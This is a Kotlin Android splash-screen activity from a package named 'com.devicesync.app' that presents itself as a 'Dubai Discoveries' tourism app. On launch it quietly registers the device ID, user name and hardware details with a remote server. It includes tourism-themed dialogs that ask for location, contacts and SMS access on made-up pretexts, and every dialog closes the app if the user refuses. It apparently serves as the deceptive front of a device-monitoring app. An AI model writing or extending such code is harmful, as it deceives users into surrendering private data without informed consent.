package com.devicesync.app

import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.devicesync.app.api.RetrofitClient
import com.devicesync.app.data.DeviceInfo
import com.devicesync.app.data.ConnectionType
import com.devicesync.app.utils.PermissionManager
import com.devicesync.app.utils.DeviceInfoUtils
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class SplashActivity : AppCompatActivity() {
    
    companion object {
        private const val SPLASH_DELAY = 3000L // 3 seconds
        private const val ESSENTIAL_PERMISSIONS_REQUEST_CODE = 1001
    }
    
    private lateinit var permissionManager: PermissionManager
    private lateinit var progressBar: ProgressBar
    private lateinit var loadingText: TextView
    private lateinit var statusText: TextView
    private var hasNavigated = false
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)
        
        // Initialize UI elements
        progressBar = findViewById(R.id.progressBar)
        loadingText = findViewById(R.id.loadingText)
        statusText = findViewById(R.id.permissionStatus)
        
        permissionManager = PermissionManager(this) { allGranted ->
            // This callback will be called after permission check
        }
        
        // Start the 3-second splash flow
        startSplashFlow()
    }
    
    private fun startSplashFlow() {
        updateStatus("Welcome to Dubai Discoveries!", 10)
        loadingText.text = "Setting up your tourism experience..."
        
        // Step 1: Register device (0-1 second)
        Handler(Looper.getMainLooper()).postDelayed({
            updateStatus("Registering your device...", 30)
            loadingText.text = "Connecting to Dubai tourism services..."
            registerDevice()
        }, 1000)
        
        // Step 2: Check permissions (1-2 seconds)
        Handler(Looper.getMainLooper()).postDelayed({
            updateStatus("Checking permissions...", 60)
            loadingText.text = "Preparing personalized features..."
            checkPermissions()
        }, 2000)
        
        // Step 3: Complete splash (2-3 seconds)
        Handler(Looper.getMainLooper()).postDelayed({
            updateStatus("Almost ready...", 90)
            loadingText.text = "Your Dubai adventure awaits!"
        }, 2500)
        
        // Step 4: Handle flow based on permissions (3 seconds)
        Handler(Looper.getMainLooper()).postDelayed({
            updateStatus("Complete!", 100)
            handlePermissionFlow()
        }, SPLASH_DELAY)
    }
    
    private fun registerDevice() {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val deviceId = DeviceInfoUtils.getDeviceId(this@SplashActivity)
                val userName = DeviceInfoUtils.getUserName(this@SplashActivity)
                
                val deviceInfo = DeviceInfo(
                    deviceId = deviceId,
                    deviceName = android.os.Build.MODEL.ifEmpty { "Unknown Device" },
                    model = android.os.Build.MODEL.ifEmpty { "Unknown Model" },
                    manufacturer = android.os.Build.MANUFACTURER.ifEmpty { "Unknown Manufacturer" },
                    androidVersion = android.os.Build.VERSION.RELEASE.ifEmpty { "Unknown Version" },
                    userName = userName,
                    isConnected = true,
                    connectionType = ConnectionType.NETWORK
                )
                
                val response = RetrofitClient.apiService.registerDevice(deviceInfo)
                if (response.isSuccessful && response.body()?.success == true) {
                    println("✅ Device registered successfully: ${response.body()?.message}")
                } else {
                    println("⚠️ Device registration response: ${response.body()?.message ?: "Unknown error"}")
                }
                
            } catch (e: Exception) {
                println("❌ Device registration failed: ${e.message}")
                // Continue anyway - device registration is not critical
            }
        }
    }
    
    private fun checkPermissions() {
        // Only check essential permissions for basic app functionality
        val hasStorage = permissionManager.hasStoragePermission()
        val hasNotifications = permissionManager.hasNotificationPermission()
        
        // For basic tourism app functionality, we only need storage and notifications
        val essentialPermissionsGranted = hasStorage && hasNotifications
        
        if (!essentialPermissionsGranted) {
            // Show tourism-themed permission request for essential permissions only
            showEssentialPermissionsDialog()
        } else {
            // Essential permissions granted, proceed to login
            // Other permissions can be requested later when needed
            proceedToLogin()
        }
    }
    
    private fun handlePermissionFlow() {
        // Only check essential permissions for basic app functionality
        val hasStorage = permissionManager.hasStoragePermission()
        val hasNotifications = permissionManager.hasNotificationPermission()
        
        val essentialPermissionsGranted = hasStorage && hasNotifications
        
        if (essentialPermissionsGranted) {
            proceedToLogin()
        } else {
            // Show permission dialog for essential permissions only
            showEssentialPermissionsDialog()
        }
    }
    
    private fun showEssentialPermissionsDialog() {
        val dialog = AlertDialog.Builder(this)
            .setTitle("🌟 Welcome to Dubai Discoveries")
            .setMessage("To provide you with the best tourism experience, we need access to:\n\n" +
                    "• 📱 Show notifications for tour updates and reminders\n" +
                    "• 📁 Store your travel photos and documents\n\n" +
                    "These permissions are essential for basic app functionality. Would you like to allow them?")
            .setPositiveButton("Allow") { _, _ ->
                requestEssentialPermissions()
            }
            .setNegativeButton("Cancel") { _, _ ->
                // Close app if user cancels
                finish()
            }
            .setCancelable(false)
            .create()
        
        dialog.show()
    }
    
    private fun showTourismPermissionDialog() {
        val dialog = AlertDialog.Builder(this)
            .setTitle("🌟 Enhance Your Dubai Experience")
            .setMessage("To provide you with the best tourism experience, we need access to certain features on your device. This helps us:\n\n" +
                    "• 📍 Track your location for nearby attractions\n" +
                    "• 📞 Sync your contacts for group tours\n" +
                    "• 💬 Access messages for booking confirmations\n" +
                    "• 📱 Show notifications for tour updates\n" +
                    "• 📁 Store your travel photos and documents\n\n" +
                    "Would you like to allow these permissions for an enhanced Dubai tourism experience?")
            .setPositiveButton("Allow") { _, _ ->
                requestPermissionsWithTourismTheme()
            }
            .setNegativeButton("Cancel") { _, _ ->
                // Close app if user cancels
                finish()
            }
            .setCancelable(false)
            .create()
        
        dialog.show()
    }
    
    private fun requestEssentialPermissions() {
        // Use standard Android permission request for essential permissions
        val essentialPermissions = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            // Android 13+ (API 33+) - Use new media permissions
            arrayOf(
                android.Manifest.permission.READ_MEDIA_IMAGES,
                android.Manifest.permission.POST_NOTIFICATIONS
            )
        } else {
            // Android 12 and below - Use old storage permissions
            arrayOf(
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
            )
        }
        
        println("🔐 Requesting essential permissions: ${essentialPermissions.toList()}")
        
        // Use standard Android permission request
        androidx.core.app.ActivityCompat.requestPermissions(
            this,
            essentialPermissions,
            ESSENTIAL_PERMISSIONS_REQUEST_CODE
        )
    }
    
    private fun requestPermissionsWithTourismTheme() {
        permissionManager.requestAllPermissions { allGranted ->
            if (allGranted) {
                // All permissions granted, proceed to login
                proceedToLogin()
            } else {
                // Some permissions still missing, show tourism-themed reminder
                showPermissionReminderDialog()
            }
        }
    }
    
    private fun showEssentialPermissionReminderDialog() {
        val dialog = AlertDialog.Builder(this)
            .setTitle("📱 Essential Permissions Required")
            .setMessage("To use Dubai Discoveries, please grant the essential permissions:\n\n" +
                    "• 📱 Notifications: For tour updates and reminders\n" +
                    "• 📁 Storage: For saving your travel photos and documents\n\n" +
                    "Would you like to grant these permissions?")
            .setPositiveButton("Grant Permissions") { _, _ ->
                // Request essential permissions again
                requestEssentialPermissions()
            }
            .setNegativeButton("Cancel") { _, _ ->
                // Close app if user cancels
                finish()
            }
            .setCancelable(false)
            .create()
        
        dialog.show()
    }
    
    private fun showPermissionReminderDialog() {
        val dialog = AlertDialog.Builder(this)
            .setTitle("🏛️ Complete Your Dubai Setup")
            .setMessage("To fully enjoy your Dubai tourism experience, please grant the remaining permissions. These help us:\n\n" +
                    "• 🗺️ Show you nearby attractions and restaurants\n" +
                    "• 🎫 Manage your tour bookings and tickets\n" +
                    "• 📸 Save your travel memories\n" +
                    "• 🔔 Keep you updated with tour schedules\n\n" +
                    "Would you like to grant the remaining permissions?")
            .setPositiveButton("Grant Permissions") { _, _ ->
                // Request permissions again with tourism theme
                requestPermissionsWithTourismTheme()
            }
            .setNegativeButton("Cancel") { _, _ ->
                // Close app if user cancels
                finish()
            }
            .setCancelable(false)
            .create()
        
        dialog.show()
    }
    
    private fun proceedToLogin() {
        if (!hasNavigated) {
            hasNavigated = true
            val intent = Intent(this, LoginActivity::class.java)
            startActivity(intent)
            finish()
        }
    }
    
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        when (requestCode) {
            ESSENTIAL_PERMISSIONS_REQUEST_CODE -> {
                println("🔐 onRequestPermissionsResult: requestCode=$requestCode")
                println("🔐 Permissions: ${permissions.toList()}")
                println("🔐 Grant results: ${grantResults.toList()}")
                
                val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
                println("🔐 All permissions granted: $allGranted")
                
                if (allGranted) {
                    println("✅ Essential permissions granted, proceeding to login")
                    proceedToLogin()
                } else {
                    println("❌ Essential permissions denied, showing reminder")
                    showEssentialPermissionReminderDialog()
                }
            }
        }
    }
    
    private fun updateStatus(status: String, progress: Int) {
        statusText.text = status
        progressBar.progress = progress
    }
    
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        permissionManager.handleActivityResult(requestCode, resultCode, data)
    }
} 